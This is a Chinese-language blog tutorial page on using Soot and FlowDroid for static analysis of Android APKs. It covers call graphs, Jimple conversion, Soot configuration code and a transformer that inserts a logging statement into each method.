<h2 id="Call-Graph"><a href="#Call-Graph" class="headerlink" title="Call Graph"></a>Call Graph</h2><p>在一个调用图中，节点是方法，有向边表示源方法可以调用目标方法。在<code>Soot</code>中，每条边都被注解了调用语句。下面是一个示例，关于这个例子，有一些需要注意，方法 <code>void &lt;clinit&gt;</code> 有一个环，但实际上没有代码可以触发这条路径：</p>
<img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/1_inAT7nX3AJqotw7p2lTdXw.png" alt="1_inAT7nX3AJqotw7p2lTdXw" style="zoom: 50%;" />

<h2 id="APK分析"><a href="#APK分析" class="headerlink" title="APK分析"></a>APK分析</h2><p>首先，使用<a target="_blank" rel="noopener" href="https://www.abartel.net/dexpler/"><em>Dexpler</em></a> 将 <code>Dalvik</code> 字节码转换为 <code>Jimple Body</code>。然后可以对整个程序进行转换、优化和注释。接下来， <code>Jimple</code> 转换包将在每个 <code>Jimple Body</code>上运行。最后，<code>Soot</code> 将所有 <code>Jimple Body</code>转换为 <code>Baf</code>（<code>Soot</code> 中的低级中间表示），并使用 <code>Dexpler</code> 将整个代码编译成 <code>APK</code>。</p>
<p><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/1_2E96Cu2BrZhrO74MxHCbTA.png" alt="1_2E96Cu2BrZhrO74MxHCbTA"></p>
<ul>
<li><code>jtp</code>，<code>jimple</code>转换包。</li>
<li><code>jop</code>，<code>jimple</code>优化包。</li>
<li><code>jap</code>，<code>jimple</code>注释包。</li>
</ul>
<p>关于包的具体信息可以看<a target="_blank" rel="noopener" href="https://github.com/soot-oss/soot/wiki/Packs-and-phases-in-Soot">这里</a>。</p>
<h3 id="Soot设置"><a href="#Soot设置" class="headerlink" title="Soot设置"></a>Soot设置</h3><p>分析<code>APK</code>之前，<code>Soot</code>还需要进行一些设置：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setupSoot</span><span class="params">(String androidJar, String apkPath, String outputPath)</span> &#123;</span><br><span class="line">    <span class="comment">// Reset the Soot settings (it&#x27;s necessary if you are analyzing several APKs)</span></span><br><span class="line">    G.reset();</span><br><span class="line">    <span class="comment">// Generic options</span></span><br><span class="line">    Options.v().set_allow_phantom_refs(<span class="literal">true</span>);</span><br><span class="line">    Options.v().set_whole_program(<span class="literal">true</span>);</span><br><span class="line">    Options.v().set_prepend_classpath(<span class="literal">true</span>);</span><br><span class="line">    <span class="comment">// Read (APK Dex-to-Jimple) Options</span></span><br><span class="line">    Options.v().set_android_jars(androidJar); <span class="comment">// The path to Android Platforms</span></span><br><span class="line">    Options.v().set_src_prec(Options.src_prec_apk); <span class="comment">// Determine the input is an APK</span></span><br><span class="line">    Options.v().set_process_dir(Collections.singletonList(apkPath)); <span class="comment">// Provide paths to the APK</span></span><br><span class="line">    Options.v().set_process_multiple_dex(<span class="literal">true</span>);  <span class="comment">// Inform Dexpler that the APK may have more than one .dex files</span></span><br><span class="line">    Options.v().set_include_all(<span class="literal">true</span>);</span><br><span class="line">    <span class="comment">// Write (APK Generation) Options</span></span><br><span class="line">    Options.v().set_output_format(Options.output_format_dex);</span><br><span class="line">    Options.v().set_output_dir(outputPath);</span><br><span class="line">    Options.v().set_validate(<span class="literal">true</span>); <span class="comment">// Validate Jimple bodies in each transofrmation pack</span></span><br><span class="line">    <span class="comment">// Resolve required classes </span></span><br><span class="line">    Scene.v().addBasicClass(<span class="string">&quot;java.io.PrintStream&quot;</span>,SootClass.SIGNATURES);</span><br><span class="line">    Scene.v().addBasicClass(<span class="string">&quot;java.lang.System&quot;</span>,SootClass.SIGNATURES);</span><br><span class="line">    Scene.v().loadNecessaryClasses();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><p>在每个方法中加入日志输出：<code>System.out.println(&quot;Beginning of method: &quot; + METHOD_NAME)</code>。<code>jimple</code>代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$r1 = &lt;java.lang.System: java.io.PrintStream out&gt;</span><br><span class="line">virtualinvoke $r1.&lt;java.io.PrintStream: <span class="keyword">void</span> <span class="title function_">println</span><span class="params">(java.lang.String)</span>&gt;(<span class="string">&quot;&lt;SOOT_TUTORIAL&gt; Beginning of method METHOD_NAME&quot;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="Body转换"><a href="#Body转换" class="headerlink" title="Body转换"></a>Body转换</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">PackManager.v().getPack(<span class="string">&quot;jtp&quot;</span>).add(<span class="keyword">new</span> <span class="title class_">Transform</span>(<span class="string">&quot;jtp.myLogger&quot;</span>, <span class="keyword">new</span> <span class="title class_">BodyTransformer</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">internalTransform</span><span class="params">(Body b, String phaseName, Map&lt;String, String&gt; options)</span> &#123;</span><br><span class="line">        <span class="comment">// First we filter out Android framework methods</span></span><br><span class="line">        <span class="keyword">if</span>(InstrumentUtil.isAndroidMethod(b.getMethod()))</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="type">JimpleBody</span> <span class="variable">body</span> <span class="operator">=</span> (JimpleBody) b;</span><br><span class="line">        <span class="type">UnitPatchingChain</span> <span class="variable">units</span> <span class="operator">=</span> b.getUnits();</span><br><span class="line">        List&lt;Unit&gt; generatedUnits = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">// The message that we want to log</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> String.format(<span class="string">&quot;%s Beginning of method %s&quot;</span>, InstrumentUtil.TAG, body.getMethod().getSignature());</span><br><span class="line">        <span class="comment">// In order to call &quot;System.out.println&quot; we need to create a local containing &quot;System.out&quot; value</span></span><br><span class="line">        <span class="type">Local</span> <span class="variable">psLocal</span> <span class="operator">=</span> InstrumentUtil.generateNewLocal(body, RefType.v(<span class="string">&quot;java.io.PrintStream&quot;</span>));</span><br><span class="line">        <span class="comment">// Now we assign &quot;System.out&quot; to psLocal</span></span><br><span class="line">        <span class="type">SootField</span> <span class="variable">sysOutField</span> <span class="operator">=</span> Scene.v().getField(<span class="string">&quot;&lt;java.lang.System: java.io.PrintStream out&gt;&quot;</span>);</span><br><span class="line">        <span class="type">AssignStmt</span> <span class="variable">sysOutAssignStmt</span> <span class="operator">=</span> Jimple.v().newAssignStmt(psLocal, Jimple.v().newStaticFieldRef(sysOutField.makeRef()));</span><br><span class="line">        generatedUnits.add(sysOutAssignStmt);</span><br><span class="line">        <span class="comment">// Create println method call and provide its parameter</span></span><br><span class="line">        <span class="type">SootMethod</span> <span class="variable">printlnMethod</span> <span class="operator">=</span> Scene.v().grabMethod(<span class="string">&quot;&lt;java.io.PrintStream: void println(java.lang.String)&gt;&quot;</span>);</span><br><span class="line">        <span class="type">Value</span> <span class="variable">printlnParamter</span> <span class="operator">=</span> StringConstant.v(content);</span><br><span class="line">        <span class="type">InvokeStmt</span> <span class="variable">printlnMethodCallStmt</span> <span class="operator">=</span> Jimple.v().newInvokeStmt(Jimple.v().newVirtualInvokeExpr(psLocal, printlnMethod.makeRef(), printlnParamter));</span><br><span class="line">        generatedUnits.add(printlnMethodCallStmt);</span><br><span class="line">        <span class="comment">// Insert the generated statement before the first  non-identity stmt</span></span><br><span class="line">        units.insertBefore(generatedUnits, body.getFirstNonIdentityStmt());</span><br><span class="line">        <span class="comment">// Validate the body to ensure that our code injection does not introduce any problem (at least statically)</span></span><br><span class="line">        b.validate();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure>

<h3 id="FlowDroid-PointsTo"><a href="#FlowDroid-PointsTo" class="headerlink" title="FlowDroid + PointsTo"></a>FlowDroid + PointsTo</h3><p><code>FlowDroid</code> 是一款用于 <code>Android</code> 应用程序和 <code>Java</code> 程序的数据流分析功能，项目<a target="_blank" rel="noopener" href="https://github.com/secure-software-engineering/FlowDroid">地址</a>。</p>
<p>如果是使用 Maven，编辑 <code>pom.xml</code>即可：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>de.fraunhofer.sit.sse.flowdroid<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>soot-infoflow<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.10.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>de.fraunhofer.sit.sse.flowdroid<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>soot-infoflow-summaries<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.10.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>de.fraunhofer.sit.sse.flowdroid<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>soot-infoflow-android<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.10.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果只使用命令行，则在<a target="_blank" rel="noopener" href="https://github.com/secure-software-engineering/FlowDroid/releases">Relase</a>里下载<code>soot-infoflow-cmd-jar-with-dependencies.jar</code>即可。</p>
<p>如果不使用<code>pom.xml</code>，使用<code>jar</code>包的方式，需要去<a target="_blank" rel="noopener" href="https://github.com/secure-software-engineering/FlowDroid/releases">Relase</a>下载<code>soot-infoflow-android-classes.jar</code>和<code>soot-infoflow-classes.jar</code>，再去Soot的<a target="_blank" rel="noopener" href="https://link.segmentfault.com/?enc=HzjYkP/HgkU1xzcZFUAgbQ==.ZT99lh7G5tR1RbjbWKkx7vAVeM5bMFQD///krUVFH6eMiI2TYxlBEYANDSAUtdFnviP1SJ4LWKbgY7RcZgTVjpwh0hB/sixiDALazZB/8Gw=">仓库</a>下载包含<code>heros</code>与<code>jasmin</code>的<code>sootclasses-trunk-jar-with-dependencies.jar</code>，将上述三个包加入项目依赖便完成了<code>FlowDroid</code>的配置。</p>
</div></article></div><nav class="pagination" role="navigation" aria-label="pagination"><div class="pagination-previous is-invisible is-hidden-mobile"><a href="/tags/android/page/0/">Previous</a></div><div class="pagination-next"><a href="/tags/android/page/2/">Next</a></div><ul class="pagination-list is-hidden-mobile"><li><a class="pagination-link is-current" href="/tags/android/">1</a></li><li><a class="pagination-link" href="/tags/android/page/2/">2</a></li></ul></nav></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="https://avatars.githubusercontent.com/u/19711495?v=4" alt="buffer0verflooow"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">buffer0verflooow</p><p class="is-size-6 is-block">Security Researcher</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>Beijing</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">Posts</p><a href="/archives"><p class="title">56</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Categories</p><a href="/categories"><p class="title">0</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Tags</p><a href="/tags"><p class="title">51</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/ppoffice" target="_blank" rel="me noopener">Follow</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Github" href="https://github.com/ppoffice"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Facebook" href="https://facebook.com"><i class="fab fa-facebook"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Twitter" href="https://twitter.com"><i class="fab fa-twitter"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Dribbble" href="https://dribbble.com"><i class="fab fa-dribbble"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="RSS" href="/"><i class="fas fa-rss"></i></a></div></div></div><!--!--><!--!--><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">Recents</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-10-10T06:23:56.000Z">2022-10-10</time></p><p class="title"><a href="/2022/10/10/%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"> </a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-07-30T07:29:09.000Z">2022-07-30</time></p><p class="title"><a href="/2022/07/30/Android%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/">Android安全笔记</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-07-20T12:35:56.000Z">2022-07-20</time></p><p class="title"><a href="/2022/07/20/Android%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/">Android中间人攻击方法整理</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-07-04T12:34:01.000Z">2022-07-04</time></p><p class="title"><a href="/2022/07/04/Android-11-%E9%AD%94%E5%BD%A2%E5%A5%B3%E6%BC%8F%E6%B4%9E/">Android 11 魔形女漏洞</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-07-01T13:59:36.000Z">2022-07-01</time></p><p class="title"><a href="/2022/07/01/macOS-Intel%E5%9B%BE%E5%BD%A2%E5%86%85%E6%A0%B8%E6%8B%93%E5%B1%95RCE-EOP/">macOS Intel图形内核拓展RCE+EOP</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">Archives</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2022/10/"><span class="level-start"><span class="level-item">October 2022</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/07/"><span class="level-start"><span class="level-item">July 2022</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/06/"><span class="level-start"><span class="level-item">June 2022</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/05/"><span class="level-start"><span class="level-item">May 2022</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/04/"><span class="level-start"><span class="level-item">April 2022</span></span><span class="level-end"><span class="level-item tag">10</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/03/"><span class="level-start"><span class="level-item">March 2022</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/02/"><span class="level-start"><span class="level-item">February 2022</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/01/"><span class="level-start"><span class="level-item">January 2022</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/12/"><span class="level-start"><span class="level-item">December 2021</span></span><span class="level-end"><span class="level-item tag">10</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/11/"><span class="level-start"><span class="level-item">November 2021</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/08/"><span class="level-start"><span class="level-item">August 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">Tags</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/ASN-1/"><span class="tag">ASN.1</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/AppleAVE2/"><span class="tag">AppleAVE2</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ContentProvider/"><span class="tag">ContentProvider</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/IOServices/"><span class="tag">IOServices</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/LPE/"><span class="tag">LPE</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/PendingIntent/"><span class="tag">PendingIntent</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/adobe/"><span class="tag">adobe</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/afl/"><span class="tag">afl++</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ams/"><span class="tag">ams</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/android/"><span class="tag">android</span><span class="tag">18</span></a></div><div class="control"><a class="tags has-addons" href="/tags/aosp/"><span class="tag">aosp</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/apple/"><span class="tag">apple</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/arm64/"><span class="tag">arm64</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/cfprefsd/"><span class="tag">cfprefsd</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/chrome/"><span class="tag">chrome</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/darwin/"><span class="tag">darwin</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/exploit/"><span class="tag">exploit</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/fuzz/"><span class="tag">fuzz</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/gpu/"><span class="tag">gpu</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/hook/"><span class="tag">hook</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/intel/"><span class="tag">intel</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/intent/"><span class="tag">intent</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/iomfb/"><span class="tag">iomfb</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ios/"><span class="tag">ios</span><span class="tag">14</span></a></div><div class="control"><a class="tags has-addons" href="/tags/linux/"><span class="tag">linux</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/logic-vul/"><span class="tag">logic vul</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/lpe/"><span class="tag">lpe</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/mach/"><span class="tag">mach</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/macos/"><span class="tag">macos</span><span class="tag">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/mig/"><span class="tag">mig</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/note/"><span class="tag">note</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/npu/"><span class="tag">npu</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pac/"><span class="tag">pac</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pipe/"><span class="tag">pipe</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pongoOS/"><span class="tag">pongoOS</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/qemu/"><span class="tag">qemu</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/qualcom/"><span class="tag">qualcom</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/qualcomm/"><span class="tag">qualcomm</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/rce/"><span class="tag">rce</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/safari/"><span class="tag">safari</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/samsung/"><span class="tag">samsung</span><span class="tag">7</span></a></div><div class="control"><a class="tags has-addons" href="/tags/soot/"><span class="tag">soot</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/static-analysis/"><span class="tag">static analysis</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/syzkaller/"><span class="tag">syzkaller</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/tcc/"><span class="tag">tcc</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/telecom/"><span class="tag">telecom</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/uaf/"><span class="tag">uaf</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/vul/"><span class="tag">vul</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/webaudio/"><span class="tag">webaudio</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/xnu/"><span class="tag">xnu</span><span class="tag">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/xpc/"><span class="tag">xpc</span><span class="tag">1</span></a></div></div></div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logo.svg" alt="buffer0verflooow - Blog" height="28"></a><p class="is-size-7"><span>&copy; 2024 buffer0verflooow</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p><p class="is-size-7">© 2019</p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script data-pjax src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script data-pjax src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "This website uses cookies to improve your experience.",
          dismiss: "Got it!",
          allow: "Allow cookies",
          deny: "Decline",
          link: "Learn more",
          policy: "Cookie Policy",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script src="/js/pjax.js"></script><!--!--><!--!--><!--!--><script data-pjax src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"Type something...","untitled":"(Untitled)","posts":"Posts","pages":"Pages","categories":"Categories","tags":"Tags"});
        });</script></body></html>